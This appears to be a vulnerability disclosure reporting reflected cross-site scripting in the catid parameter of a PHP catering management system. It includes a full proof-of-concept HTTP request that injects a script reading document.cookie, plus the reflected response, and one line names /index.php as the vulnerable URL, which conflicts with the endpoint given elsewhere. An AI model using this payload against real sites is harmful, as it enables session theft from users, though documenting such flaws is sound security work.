# online-catering-management-system-v1.0

##Auditor:
Devansh Dubey

##Description:
Reflected XSS in Online Catering Management System
Link: https://phpgurukul.com/online-catering-management-system-using-php-and-mysql/

Online Catering Management System 1.0 is vulnerable to Cross-site scripting (XSS) in /ocms/categorywise-food.php via catid parameter.

Vulnerable Endpoint - /ocms/categorywise-food.php via catid parameter.

##PoCs
Vulnerable URL: /index.php

###Request

GET /ocms/categorywise-food.php?catid=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/1.1
Host: localhost:8000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=s6qjv42g2ib2rvqinfgrkkgku8
Upgrade-Insecure-Requests: 1
Priority: u=0, i

###Response
---- snip ----
"><script>
alert(document.cookie)
</script>
---- snip ----

